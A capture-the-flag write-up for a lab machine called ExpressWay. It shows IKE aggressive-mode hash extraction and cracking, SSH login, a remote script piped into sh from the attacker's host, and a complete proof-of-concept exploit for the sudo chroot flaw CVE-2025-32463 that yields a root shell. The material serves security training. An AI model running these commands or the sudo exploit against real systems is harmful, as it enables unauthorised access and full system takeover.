# ExpressWay Machine

> Goal: Get **user.txt** and **root.txt** using IKE Aggressive Mode → SSH → Local Privilege Escalation
> 

---

## 1. Initial Enumeration (Nmap)

### TCP scan

```bash
nmap -sCV 10.129.10.130
```

**Result:**

- `22/tcp` → SSH (OpenSSH 10.0p2)
- OS: Linux

So initially, only SSH is visible on TCP.

---

### UDP scan (important)

```bash
nmap -sU -p 500,4500 10.129.10.130
```

**Result:**

- `500/udp` → ISAKMP (IKE)
- `4500/udp` → NAT-T IKE

This strongly suggests **IPsec VPN**.

---

## 2. IKE Enumeration (Aggressive Mode)

### Check if Aggressive Mode is enabled

```bash
ike-scan -A 10.129.10.130
```

**Result:**

- Aggressive Mode Handshake returned
- Authentication: PSK
- ID leaked: `ike@expressway.htb`

This is a **design flaw** of IKEv1 Aggressive Mode: it leaks enough info for offline cracking.

---

## 3. Extract PSK Hash

```bash
ike-scan -M -A --pskcrack=ike_psk.txt 10.129.10.130
```

This creates a **crackable PSK hash**.

Verify:

```bash
cat ike_psk.txt
```

You should see **one long colon‑separated line**.

---

## 4. Crack the PSK

### Using psk-crack

```bash
psk-crack -d /usr/share/wordlists/rockyou.txt ike_psk.txt
```

- You can also use hashcat to crack this hash(ike.psk.txt)
    - Ex :
    
    ```jsx
    hashcat -m 5400 ike_psk.txt  /usr/share/wordlists/rockyou.txt --force
    ```
    

**Result:**

```
key: freakingrockstarontheroad
```

> Important: `5400` = IKEv1 **Aggressive Mode**
> 

---

## 5. SSH Access

Try SSH using leaked ID + cracked PSK:

```bash
ssh ike@10.129.10.130
```

Password:

```
freakingrockstarontheroad
```

✅ SSH access successful.

---

## 6. User Flag

```bash
ls
cat user.txt
```

User flag obtained.

---

## 7. Privilege Escalation Enumeration

### Upload & run linpeas

On Kali:

```bash
sudo python3 -m http.server 80
```

On victim:

```bash
curl http://<KALI_IP>/linpeas.sh | sh
```

### Key finding

```
Sudo version 1.9.17
```

---

## 8. Vulnerability Research

Sudo version `1.9.17` is vulnerable to:

**CVE‑2025‑32463 – sudo chroot local privilege escalation**

Important notes:

- Requires sudo access
- Exploits sudo chroot behavior
- Does NOT bypass authentication (but we already have user password)

---

## 9. Exploitation (CVE‑2025‑32463)

### Create exploit file

```bash
nano /tmp/exploit.sh
```

Paste PoC code:

```bash
#!/bin/bash
STAGE=$(mktemp -d /tmp/sudowoot.stage.XXXXXX)
cd ${STAGE?} || exit 1

cat > woot1337.c<<EOF
#include <stdlib.h>
#include <unistd.h>
__attribute__((constructor)) void woot(void) {
  setreuid(0,0);
  setregid(0,0);
  chdir("/");
  execl("/bin/bash", "/bin/bash", NULL);
}
EOF

mkdir -p woot/etc libnss_
echo "passwd: /woot1337" > woot/etc/nsswitch.conf
cp /etc/group woot/etc
gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c

echo "woot!"
sudo -R woot woot
rm -rf ${STAGE?}

```

### Make executable & run

```bash
chmod +x exploit.sh
./exploit.sh
```

Output:

```
woot!
```

You cracked the sudo, now u can access the  root directory as a normal user(ike)

---

## 10. Root Flag

```bash
cd /root
ls
cat root.txt
```

🎉 Root flag captured.

---